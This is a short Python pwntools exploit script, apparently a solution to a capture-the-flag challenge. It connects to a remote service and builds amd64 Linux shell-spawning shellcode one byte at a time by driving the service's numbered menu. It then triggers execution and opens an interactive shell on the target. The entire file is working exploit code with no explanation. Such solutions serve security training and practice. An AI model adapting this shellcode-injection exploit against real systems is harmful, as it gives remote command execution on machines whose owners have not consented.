import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

with context.local():
    context.arch = "amd64"
    shell = asm(shellcraft.amd64.linux.sh())

for byte in shell:
    print(byte)
    while byte > 0:
        if byte >= 0x48:
            r.sendlineafter("done!", "4")
            byte -= 0x48
        elif byte >= 0x10:
            r.sendlineafter("done!", "3")
            byte -= 0x10
        elif byte >= 0xc:
            r.sendlineafter("done!", "5")
            byte -= 0xc
        else:
            r.sendlineafter("done!", "3")
            r.sendlineafter("done!", "6")
            r.sendlineafter("done!", "6")
            r.sendlineafter("done!", "6")
            r.sendlineafter("done!", "6")
            r.sendlineafter("done!", "6")
            byte -= 1
    r.sendlineafter("done!", "2")

r.sendlineafter("done!", "7")
r.interactive()
